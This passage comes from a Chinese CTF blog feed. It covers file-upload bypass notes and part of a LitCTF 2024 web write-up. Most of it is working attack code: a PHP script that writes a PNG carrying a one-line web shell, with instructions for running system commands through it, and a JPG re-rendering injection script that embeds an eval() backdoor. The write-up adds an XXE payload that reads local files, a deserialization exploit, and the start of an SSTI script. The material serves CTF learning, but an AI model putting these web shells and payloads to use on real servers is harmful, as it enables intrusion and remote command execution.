class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">------------------------------------</span><br><span class="line">           创建<span class="number">1</span>.png图片成功！      </span><br><span class="line">------------------------------------</span><br></pre></td></tr></table></figure></p><h4 id="JPG二次渲染"><a href="#JPG二次渲染" class="headerlink" title="JPG二次渲染"></a>JPG二次渲染</h4><blockquote><p>建议先传正常jpg然后让靶机渲染一次后再下载下来进行脚本添加木马<br>使用方法：php 脚本.php 需要操作的图片.jpg</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件下载包含"><a href="#文件下载包含" class="headerlink" title="文件下载包含"></a>文件下载包含</h3><p>前提：靶机下载功能的实现代码中有文件包含函数并且能包含我们上传的文件（即可利用该函数）<br>利用：先成功上传含有木马的文件，然后尝试找到对应下载时触发包含函数的操作点，在此进行命令执行拿到flag</p><blockquote><p>例：ctfshow web166<br>本题只允许上传zip，并且提供了下载功能，<br>有些网站的文件下载功能是通过直接include包含然后返回用户来下载的<br>尝试在zip文件内加入一句话木马，然后在下载时抓包并加入系统命令发现执行成功</p></blockquote><p><img src="https://s2.loli.net/2024/06/13/v7kzmiP9oTsKOxe.png" alt=""></p><p>参考：<br><a href="https://www.freebuf.com/articles/web/288430.html">https://www.freebuf.com/articles/web/288430.html</a><br><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a><br><a href="https://www.cnblogs.com/Pengj/p/17602181.html">https://www.cnblogs.com/Pengj/p/17602181.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF 2024</title>
      <link href="/posts/LitCTF2024.html"/>
      <url>/posts/LitCTF2024.html</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h3><p>无过滤 xml 注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/AQgYexBIkmqO89D.png" alt=""></p><h3 id="SAS-Serializing-Authentication"><a href="#SAS-Serializing-Authentication" class="headerlink" title="SAS - Serializing Authentication"></a>SAS - Serializing Authentication</h3><p>入门级反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接赋值账号密码即可通过检查，题目会对其 base64 解码，所以传入 base64 加密后的代码</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="variable">$a</span>-&gt;username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>-&gt;password=<span class="string">&quot;secure_password&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:15:&quot;secure_password&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h3><p><img src="https://s2.loli.net/2024/06/05/u2hOsoVa6L3QRAr.png" alt=""></p><p>尝试输入49回显了 49，证明存在 ssti 注入</p><p><code>&#123;&#123;''.__class__.__base__.subclasses__()&#125;&#125;可以查询所有子类结果，这里用脚本爆破想要的函数</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#post请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span 